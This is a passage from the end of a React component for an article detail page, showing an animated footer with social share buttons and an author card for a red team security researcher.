            </motion.section>

            {/* Footer */}
            <motion.div
              className="border-t border-gray-700/50 pt-8"
              initial={{ opacity: 0, y: 30 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.8, delay: 1.1 }}
            >
              <div className="flex flex-col md:flex-row items-center justify-between space-y-4 md:space-y-0">
                <div className="flex items-center space-x-6">
                  <button className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors">
                    <span className="text-xl">🐦</span>
                    <span>Share on Twitter</span>
                  </button>
                  <button className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors">
                    <span className="text-xl">💼</span>
                    <span>Share on LinkedIn</span>
                  </button>
                  <button className="flex items-center space-x-2 text-gray-400 hover:text-white transition-colors">
                    <span className="text-xl">📋</span>
                    <span>Copy Link</span>
                  </button>
                </div>
                
                <div className="flex items-center space-x-4">
                  <div className="w-12 h-12 bg-red-500/20 rounded-full border border-red-500/30 flex items-center justify-center">
                    <span className="text-xl">👨‍💻</span>
                  </div>
                  <div>
                    <h4 className="text-sm font-semibold text-white">Darrius Grate</h4>
                    <p className="text-xs text-gray-400">Red Team Security Researcher</p>
                  </div>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </div>
    </DetailPageLayout>
  )
}
